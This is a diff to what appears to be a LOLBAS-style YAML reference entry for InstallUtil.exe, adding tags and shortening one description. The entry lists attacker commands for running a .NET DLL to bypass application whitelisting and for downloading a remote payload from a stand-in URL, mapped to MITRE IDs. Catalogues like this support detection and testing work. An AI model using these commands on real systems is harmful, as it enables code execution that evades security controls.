@@ -11,6 +11,9 @@ Commands:
     Privileges: User
     MitreID: T1218.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: DLL
+      - Input: Custom Format
   - Command: InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
     Description: Execute the target .NET DLL or EXE.
     Usecase: Use to execute code and bypass application whitelisting
@@ -18,13 +21,18 @@ Commands:
     Privileges: User
     MitreID: T1218.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: DLL
+      - Input: Custom Format
   - Command: InstallUtil.exe https://example.com/payload
-    Description: It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)
+    Description: It will download a remote payload and place it in INetCache.
     Usecase: Downloads payload from remote server
     Category: Download
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Download: INetCache
 Full_Path:
   - Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe
   - Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe
